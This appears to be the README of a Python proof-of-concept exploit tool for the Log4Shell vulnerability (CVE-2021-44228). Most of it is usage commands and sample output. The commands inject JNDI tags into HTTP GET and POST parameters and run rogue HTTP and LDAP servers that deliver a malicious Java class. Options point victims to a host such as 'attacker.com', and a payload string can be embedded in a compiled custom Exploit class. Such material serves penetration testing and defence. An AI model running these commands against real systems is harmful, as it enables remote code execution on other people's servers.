# Python Log4RCE

An all-in-one pure Python3 PoC for [CVE-2021-44228](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-44228).

## Sample

```bash
> python3 log4rce.py --target "linux" --payload "PAYLOAD" http -X POST --url "http://localhost:8080/" --data "address=###"
```

```
INFO:HTTP:Running on local port 1337
INFO:HTTP:Remote target is http://127.0.0.1:1337/LinuxExploit.class
INFO:LDAP:Running on local port 1387
INFO:Log4J:Sending payload to http://localhost:8080/
INFO:LDAP:Query from ('127.0.0.1', 42554)
INFO:HTTP:Request from ('127.0.0.1', 55328) to /LinuxExploit.class
INFO:Log4J:Done!
```

## Usage

This is a CLI tool. All options can be found in the help menu:

```bash
python3 log4rce.py --help
```

The list is pretty extensive, therefore the following will give you a summary of the functionality.

### Attack Modes

The tool allows you to use a few attack modes. These attacks are extensions of the `Log4RCE` class.

#### HTTP

You can perform an automated HTTP request attack on a target URL.

You can perform a GET request as follows:

```bash
python3 log4rce.py http --url "http://www.vuln.com:1234/?vuln_param=###&param=123" --headers="P1=123&P2=123"
```

You can perform a POST request as follows:

```bash
python3 log4rce.py http -X POST --url "http://www.vuln.com:1234/" --data "vuln_param=###&param=123" --headers="P1=123&P2=123"
```

The previous will inject the JNDI tag into `###`.

#### Manual

If you cannot use any of the previous, use this mode to dump the JDNI tag:

```bash
python3 log4rce.py manual
```

### Network Settings

The tool allows extensive customization for most network configuration. All the internal servers can be modified to point to different locations according the the remote settings.

#### HTTP Server

You can configure the HTTP server using the following parameters:

```bash
python3 log4rce.py --http_port 1234 --http_rport 12345 --http_host "attacker.com"
```

```
http_port: The local port to run the server on.
http_rport: The port that a remote machine accesses.
http_host: The host name/IP a remote machine accesses. 
```

#### LDAP Server

You can configure the LDAP server using the following parameters:

```bash
python3 log4rce.py --ldap_port 1234 --ldap_rport 12345 --ldap_host "attacker.com"
```

```
ldap_port: The local port to run the server on.
ldap_rport: The port that a remote machine accesses.
ldap_host: The host name/IP a remote machine accesses. 
```

### Customization

The tool allows can handle some customization. The following lists some functionality you may be interested in.

### Injecting Payload

You can inject a payload into the Java class using:

```bash
python3 log4rce.py --payload "PAYLOAD"
```

The payload will be injected into `"###"` strings.

### Custom Java Payload

You can build your own Java class using the following. 

```bash
javac -source 1.7 -target 1.7 /path/to/Exploit.java
```

The resulting `.class` can be run using:

```bash
python3 log4rce.py --java_class "/path/to/Exploit.class" ...
```

Note: You can add a string `"###"` to allow payload injection.
